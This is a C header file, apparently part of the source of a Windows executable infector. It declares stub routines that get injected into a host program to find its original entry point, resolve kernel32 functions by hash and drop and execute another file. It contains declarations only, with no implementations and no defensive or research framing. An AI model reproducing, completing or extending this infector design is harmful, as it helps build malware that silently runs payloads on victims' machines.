#ifndef _STUB_H
#define _STUB_H

#include <Windows.h>
#include <stddef.h>

#define PLACE_HOLDER	0xcccccccc

struct loaded_apis {
	void *create_fileW;
	void *write_file;
	void *create_procW;
	void *get_temp_pathW;
	void *get_temp_file_nameW;
};

void stub_entry(void);
extern size_t stub_entry_size;

/* pointer to the offset caclulation base mark */
extern size_t base_offset;

void get_oep(void);
extern size_t get_oep_size;

void drop_and_execute(void);
extern size_t drop_and_execute_size;

void mark_success(void);
extern size_t mark_success_size;

void get_infctr_details(void);
extern size_t get_infctr_details_size;

void load_kernel32_funcs(void);
extern size_t load_kernel32_funcs_size;

/* inserted if GetModuleHandleA/W is imported by the host */
void get_kernel32_addr1(void);
extern size_t get_kernel32_addr1_size;

/* inserted if Kernel32 is imported by the host */
void get_kernel32_addr2(void);
extern size_t get_kernel32_addr2_size;

/* imported if none of the above conditions are met */
void get_kernel32_addr3(void);
extern size_t get_kernel32_addr3_size;

void execute_file(void);
extern size_t execute_file_size;

void drop_file(void);
extern size_t drop_file_size;

/* only used by get_kernel32_addr3 */
void get_module_base(void);
extern size_t get_module_base_size;

void gpa_by_hash(void);
extern size_t gpa_by_hash_size;

void mstrlen(void);
extern size_t mstrlen_size;

void mstrcmp(void);
extern size_t mstrcmp_size;

void hash_func(void);
extern size_t hash_func_size;

#endif